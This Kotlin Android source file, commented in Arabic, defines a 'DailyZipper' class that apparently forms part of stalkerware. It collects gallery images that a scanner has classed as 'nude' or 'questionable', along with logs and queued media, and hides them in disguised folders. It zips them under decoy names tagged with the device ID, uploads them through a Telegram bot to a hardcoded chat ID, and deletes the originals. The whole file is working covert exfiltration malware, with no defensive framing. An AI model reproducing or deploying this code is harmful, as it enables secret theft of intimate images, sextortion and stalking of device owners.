package com.example.app

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.StatFs
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
 * ✅ تم إزالة كافة استخدامات [] واستبدالها بـ put/getOrElse/entries لتجنب MatchGroupCollection.
 */
class DailyZipper(
    context: Context,
    private val scanner: Any? = null,
    private val telegram: Any? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val activeMutex = Mutex()
    private val isActive = AtomicBoolean(false)
    private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())

    private var maxBatchSize = 48L * 1024L * 1024L // 48MB

    // ========== المسارات والملفات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val harvestDir: File by lazy {
        File(runtimeDir, "harvest").apply {
            if (!exists()) mkdirs()
        }
    }

    private val pendingDir: File by lazy {
        File(harvestDir, "pending_upload").apply {
            if (!exists()) mkdirs()
        }
    }

    private val queueDir: File by lazy {
        File(runtimeDir, ".cache_thumb").apply {
            if (!exists()) mkdirs()
        }
    }

    private val configFile: File by lazy {
        File(runtimeDir, "zipper_config.json")
    }

    private val logFile: File by lazy {
        File(runtimeDir, "z.log")
    }

    private val deviceTag: String by lazy {
        getDeviceTag()
    }

    // ========== الإعدادات (HashMap صريح) ==========
    private val config = HashMap<String, Any>()

    companion object {
        private const val TAG = "DailyZipper"

        @JvmStatic
        fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
            return DailyZipper(context, scanner, telegram)
        }
    }

    init {
        config.put("max_batch_size", 48L * 1024L * 1024L)
        config.put("storage_extra", 100L * 1024L * 1024L)
        config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
        config.put("max_processed_hashes", 10000)
        config.put("default_vault_id", -1003577715762L)
        config.put("enable_encryption", false)
        config.put("password", "ShieldCore2024!")
        config.put("max_batches", 10)
        loadConfig()
    }

    // ========== دوال مساعدة للوصول إلى الإعدادات (بدون [] أو get) ==========
    @Suppress("UNCHECKED_CAST")
    private fun <T> getConfigValue(key: String, default: T): T {
        val entry = config.entries.firstOrNull { it.key == key }
        val value = entry?.value ?: return default
        return try {
            when (default) {
                is Long -> (value as Number).toLong() as T
                is Int -> (value as Number).toInt() as T
                is Boolean -> value as T
                is String -> value as T
                is List<*> -> value as T
                else -> value as T
            }
        } catch (e: Exception) {
            default
        }
    }

    private fun extractConfigValues(): ConfigValues {
        return ConfigValues(
            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L),
            storageExtra = getConfigValue("storage_extra", 100L * 1024L * 1024L),
            sendRetryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
            maxProcessedHashes = getConfigValue("max_processed_hashes", 10000),
            defaultVaultId = getConfigValue("default_vault_id", -1003577715762L),
            maxBatches = getConfigValue("max_batches", 10)
        )
    }

    private data class ConfigValues(
        val maxBatchSize: Long,
        val storageExtra: Long,
        val sendRetryDelays: List<Long>,
        val maxProcessedHashes: Int,
        val defaultVaultId: Long,
        val maxBatches: Int
    )

    // ============================================================
    //  إدارة التكوين والإعدادات
    // ============================================================

    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                val value = json.opt(key)
                if (value != null) {
                    config.put(key, value)
                }
            }
            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun saveConfig(): Boolean {
        return try {
            val json = JSONObject(config as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
            true
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  الأدوات وفحوصات النظام
    // ============================================================

    private fun getDeviceTag(): String {
        val ctx = appContext
        if (ctx != null) {
            try {
                val androidId = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                if (!androidId.isNullOrEmpty()) {
                    return androidId.take(8).lowercase(Locale.US)
                }
            } catch (_: Exception) { /* تجاهل */ }
        }
        return try {
            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
            val md = MessageDigest.getInstance("MD5")
            md.digest(model.toByteArray()).joinToString("") { "%02x".format(it) }.take(8)
        } catch (e: Exception) {
            "unknown"
        }
    }

    private fun checkStorage(requiredBytes: Long): Boolean {
        val cfg = extractConfigValues()
        return try {
            val stat = StatFs(runtimeDir.absolutePath)
            val available = stat.availableBlocksLong * stat.blockSizeLong
            available > (requiredBytes * 2 + cfg.storageExtra)
        } catch (e: Exception) {
            true
        }
    }

    // ============================================================
    //  أدوات الملفات والتجزئة
    // ============================================================

    private fun fileHash(file: File): String? {
        if (!file.exists() || !file.isFile) return null
        return try {
            val md = MessageDigest.getInstance("MD5")
            file.inputStream().use { input ->
                val buffer = ByteArray(4096)
                var bytesRead: Int
                while (input.read(buffer).also { bytesRead = it } != -1) {
                    md.update(buffer, 0, bytesRead)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            null
        }
    }

    private fun generateZipName(): String {
        val prefixes = arrayOf("cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_")
        val dateStr = SimpleDateFormat("yyMMdd", Locale.US).format(Date())
        val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        val suffix = (1..6).map { chars.random() }.joinToString("")
        val prefix = prefixes.random()
        return "${prefix}${dateStr}_${deviceTag}_$suffix.zip"
    }

    private fun safeRemove(file: File): Boolean {
        return try {
            if (file.exists()) file.delete() else false
        } catch (e: Exception) {
            writeLog("Safe remove error ${file.absolutePath}: ${e.message}")
            false
        }
    }

    // ============================================================
    //  فحص الشبكة
    // ============================================================

    private fun isOnWifi(): Boolean {
        val ctx = appContext ?: return true
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return true
        return try {
            val network = cm.activeNetwork ?: return false
            val capabilities = cm.getNetworkCapabilities(network) ?: return false
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            true
        }
    }

    // ============================================================
    //  إرسال الملفات مع إعادة المحاولة
    // ============================================================

    private suspend fun safeSend(
        zipPath: String,
        caption: String,
        targetChat: Long? = null
    ): Boolean {
        if (telegram == null) return false

        val cfg = extractConfigValues()
        var target = targetChat
        if (target == null) {
            target = invokeMethod(telegram, "getVlt") as? Long
        }
        if (target == null) {
            target = invokeMethod(telegram, "getDat") as? Long
        }
        if (target == null) {
            target = cfg.defaultVaultId
        }

        val zipFile = File(zipPath)
        if (!zipFile.exists()) {
            writeLog("Zip file not found: $zipPath")
            return false
        }

        val delays = cfg.sendRetryDelays

        for ((attempt, delayMs) in delays.withIndex()) {
            try {
                val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
                // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection
                val isOk = if (result is Map<*, *>) {
                    val okEntry = result.entries.firstOrNull { it.key?.toString() == "ok" }
                    val okValue = okEntry?.value
                    okValue == true || okValue?.toString() == "true"
                } else {
                    false
                }
                if (isOk) {
                    return true
                }
                writeLog("Send attempt ${attempt + 1} failed")
            } catch (e: Exception) {
                writeLog("Send error (attempt ${attempt + 1}): ${e.message}")
            }
            if (attempt < delays.size - 1) {
                delay(delayMs)
            }
        }
        return false
    }

    // ============================================================
    //  إجبار الإرسال الفوري
    // ============================================================

    fun forceSendNow(chatId: Long? = null): Boolean {
        scope.launch {
            if (isActive.get()) {
                if (chatId != null && telegram != null) {
                    sendMessage(chatId, "⏳ عملية حصاد جارية بالفعل...")
                }
                return@launch
            }

            val filesToPack = mutableListOf<File>()
            var totalSize = 0L

            listOf(queueDir, pendingDir).forEach { folder ->
                if (folder.exists()) {
                    folder.listFiles()?.forEach { file ->
                        if (file.isFile && file.length() > 0) {
                            filesToPack.add(file)
                            totalSize += file.length()
                        }
                    }
                }
            }

            if (filesToPack.isEmpty()) {
                if (chatId != null && telegram != null) {
                    sendMessage(chatId, "📭 لا توجد ملفات جديدة للحصاد حالياً.")
                }
                return@launch
            }

            if (!checkStorage(totalSize)) {
                if (chatId != null && telegram != null) {
                    sendMessage(chatId, "⚠️ المساحة غير كافية لإنشاء الأرشيف.")
                }
                return@launch
            }

            if (chatId != null && telegram != null) {
                val mb = totalSize.toDouble() / (1024.0 * 1024.0)
                val msg = "🚀 جاري معالجة ${filesToPack.size} ملفاً (${"%.1f".format(Locale.US, mb)} MB)..."
                sendMessage(chatId, msg)
            }

            packAndShip(filesToPack, bypassWifi = true, reportId = chatId)
        }
        return true
    }

    // ============================================================
    //  الضغط والتغليف والتحزيم
    // ============================================================

    private suspend fun packAndShip(
        files: List<File>,
        bypassWifi: Boolean = false,
        reportId: Long? = null
    ): Boolean {
        if (files.isEmpty()) return false

        val cfg = extractConfigValues()
        val maxHashes = cfg.maxProcessedHashes
        val maxBatches = cfg.maxBatches

        activeMutex.withLock {
            if (isActive.get()) return false
            isActive.set(true)
        }

        try {
            if (!bypassWifi && !isOnWifi()) {
                writeLog("Not on WiFi, skipping automatic harvest.")
                return false
            }

            val uniqueFiles = mutableListOf<File>()
            var totalSize = 0L

            files.forEach { file ->
                if (file.exists()) {
                    val hash = fileHash(file)
                    if (hash != null && !processedHashes.contains(hash)) {
                        uniqueFiles.add(file)
                        processedHashes.add(hash)
                        totalSize += file.length()
                    }
                }
            }

            if (uniqueFiles.isEmpty()) {
                writeLog("No unique files to process")
                return false
            }

            if (processedHashes.size > maxHashes) {
                processedHashes.clear()
            }

            if (!checkStorage(totalSize)) {
                writeLog("Insufficient storage for packing")
                if (reportId != null) {
                    sendMessage(reportId, "⚠️ المساحة غير كافية")
                }
                return false
            }

            val batches = mutableListOf<MutableList<File>>()
            var curBatch = mutableListOf<File>()
            var curSize = 0L

            uniqueFiles.forEach { file ->
                val fsz = file.length()
                if (fsz > maxBatchSize) {
                    if (curBatch.isNotEmpty()) {
                        batches.add(curBatch)
                        curBatch = mutableListOf()
                        curSize = 0L
                    }
                    batches.add(mutableListOf(file))
                    return@forEach
                }

                if (curSize + fsz > maxBatchSize) {
                    if (curBatch.isNotEmpty()) {
                        batches.add(curBatch)
                    }
                    curBatch = mutableListOf()
                    curSize = 0L
                }

                curBatch.add(file)
                curSize += fsz
            }

            if (curBatch.isNotEmpty()) {
                batches.add(curBatch)
            }

            val limitedBatches = if (batches.size > maxBatches) {
                writeLog("Too many batches (${batches.size}), limiting to $maxBatches")
                batches.take(maxBatches)
            } else {
                batches
            }

            var successCount = 0

            for ((idx, batch) in limitedBatches.withIndex()) {
                val zipName = generateZipName()
                val zipFile = File(harvestDir, zipName)
                var manifestFile: File? = null

                try {
                    val manifestJson = JSONObject().apply {
                        put("device_tag", deviceTag)
                        put("timestamp", System.currentTimeMillis() / 1000)
                        put("batch", idx + 1)
                        put("total_batches", limitedBatches.size)

                        val filesArr = JSONArray()
                        batch.forEach { f ->
                            val fName = f.name
                            val fLower = fName.lowercase(Locale.US)
                            val fType = when {
                                fLower.endsWith(".jpg") || fLower.endsWith(".jpeg") ||
                                        fLower.endsWith(".png") || fLower.endsWith(".webp") ||
                                        fLower.endsWith(".bmp") -> "image"
                                fLower.endsWith(".aac") || fLower.endsWith(".mp3") ||
                                        fLower.endsWith(".wav") || fLower.endsWith(".m4a") -> "audio"
                                fLower.endsWith(".txt") -> "log"
                                fLower.endsWith(".mp4") || fLower.endsWith(".avi") ||
                                        fLower.endsWith(".mov") || fLower.endsWith(".mkv") -> "video"
                                else -> "other"
                            }
                            filesArr.put(
                                JSONObject().apply {
                                    put("name", fName)
                                    put("size", f.length())
                                    put("type", fType)
                                    put("hash", fileHash(f) ?: "")
                                    put("timestamp", f.lastModified() / 1000)
                                }
                            )
                        }
                        put("files", filesArr)
                    }

                    manifestFile = File(
                        harvestDir,
                        "manifest_${System.currentTimeMillis()}_${(1000..9999).random()}.json"
                    )
                    manifestFile.writeText(manifestJson.toString(2), Charsets.UTF_8)

                    val zipCreated = createZipArchive(zipFile, batch, manifestFile)

                    if (!zipCreated || zipFile.length() < 1024) {
                        safeRemove(zipFile)
                        throw Exception("Zip file too small or creation failed")
                    }

                    safeRemove(manifestFile)
                    manifestFile = null

                    val modeStr = if (bypassWifi) "إرسال فوري" else "حصاد تلقائي"
                    val caption = "📦 $modeStr | دفعة ${idx + 1}/${limitedBatches.size} | ${batch.size} ملفات"

                    val sent = safeSend(zipFile.absolutePath, caption, reportId)

                    if (sent) {
                        batch.forEach { safeRemove(it) }
                        successCount++
                        if (reportId != null) {
                            sendMessage(reportId, "✅ تم إرسال الدفعة ${idx + 1}/${limitedBatches.size} بنجاح")
                        }
                    } else {
                        if (reportId != null) {
                            sendMessage(reportId, "❌ فشل إرسال الدفعة ${idx + 1}")
                        }
                    }

                } catch (e: Exception) {
                    writeLog("Packing error: ${e.message}")
                    if (reportId != null) {
                        sendMessage(reportId, "⚠️ خطأ في الضغط: ${e.message?.take(100)}")
                    }
                } finally {
                    safeRemove(zipFile)
                    manifestFile?.let { safeRemove(it) }
                }

                if (idx < limitedBatches.size - 1) {
                    delay(5000L)
                }
            }

            if (reportId != null) {
                val msg = "🏁 انتهت العملية. نجح إرسال $successCount/${limitedBatches.size} دفعات."
                sendMessage(reportId, msg)
            }

            return successCount > 0

        } finally {
            isActive.set(false)
            System.gc()
        }
    }

    // ============================================================
    //  إنشاء أرشيف ZIP
    // ============================================================

    private fun createZipArchive(
        zipFile: File,
        files: List<File>,
        manifestFile: File
    ): Boolean {
        return try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                val buffer = ByteArray(4096)

                files.forEach { file ->
                    if (file.exists()) {
                        FileInputStream(file).use { fis ->
                            val entry = ZipEntry(file.name)
                            zos.putNextEntry(entry)
                            var len: Int
                            while (fis.read(buffer).also { len = it } > 0) {
                                zos.write(buffer, 0, len)
                            }
                            zos.closeEntry()
                        }
                    }
                }

                if (manifestFile.exists()) {
                    FileInputStream(manifestFile).use { fis ->
                        val entry = ZipEntry("manifest.json")
                        zos.putNextEntry(entry)
                        var len: Int
                        while (fis.read(buffer).also { len = it } > 0) {
                            zos.write(buffer, 0, len)
                        }
                        zos.closeEntry()
                    }
                }
            }
            true
        } catch (e: Exception) {
            writeLog("Create zip failed: ${e.message}")
            false
        }
    }

    // ============================================================
    //  التشغيل التلقائي
    // ============================================================

    fun run(): Boolean {
        scope.launch {
            activeMutex.withLock {
                if (isActive.get()) return@launch
            }

            if (!isOnWifi()) {
                writeLog("Not on WiFi, skipping automatic harvest.")
                return@launch
            }

            val allFiles = mutableListOf<File>()

            if (scanner != null) {
                try {
                    listOf("nude", "questionable").forEach { cat ->
                        val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                        items?.forEach { item ->
                            // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection
                            if (item is Map<*, *>) {
                                val pathEntry = item.entries.firstOrNull { it.key?.toString() == "path" }
                                val path = pathEntry?.value?.toString()
                                if (!path.isNullOrEmpty()) {
                                    val f = File(path)
                                    if (f.exists()) {
                                        allFiles.add(f)
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    writeLog("Scanner category scan error: ${e.message}")
                }
            }

            if (queueDir.exists()) {
                queueDir.listFiles()?.forEach { f ->
                    if (f.isFile && f.length() > 0) {
                        allFiles.add(f)
                    }
                }
            }

            runtimeDir.listFiles()?.forEach { f ->
                if (f.name.endsWith(".log") && f.name !in listOf("z.log", "t.log")) {
                    if (f.length() > 100 * 1024) {
                        allFiles.add(f)
                    }
                }
            }

            val uniqueFiles = allFiles.distinctBy { it.absolutePath }

            if (uniqueFiles.isNotEmpty()) {
                if (telegram != null) {
                    val did = invokeMethod(scanner, "getDid") as? String ?: "Unknown"
                    invokeMethod(telegram, "notifyHarvest", did, uniqueFiles.size)
                }
                packAndShip(uniqueFiles, bypassWifi = false, reportId = null)
            }
        }
        return true
    }

    // ============================================================
    //  أدوات مساعدة والإحصائيات
    // ============================================================

    fun clearHashCache() {
        processedHashes.clear()
    }

    fun getStats(): Map<String, Any> {
        var count = 0
        var totalSize = 0L

        listOf(queueDir, pendingDir).forEach { folder ->
            if (folder.exists()) {
                folder.listFiles()?.forEach { f ->
                    if (f.isFile) {
                        count++
                        totalSize += f.length()
                    }
                }
            }
        }

        val result = HashMap<String, Any>()
        result.put("pending", count)
        result.put("size", totalSize)
        return result
    }

    // ============================================================
    //  دوال المساعدة والتواصل (Reflection Helpers)
    // ============================================================

    private fun sendMessage(chatId: Long, text: String) {
        if (telegram == null) return
        val params = HashMap<String, Any>()
        params.put("chat_id", chatId)
        params.put("text", text)
        invokeMethod(telegram, "api", "sendMessage", params)
    }

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val logText = "[$timestamp] [INFO] $message\n"
            logFile.appendText(logText, Charsets.UTF_8)
        } catch (_: Exception) { /* تجاهل */ }
    }

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null
        return try {
            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
                ?: return null
            method.isAccessible = true
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}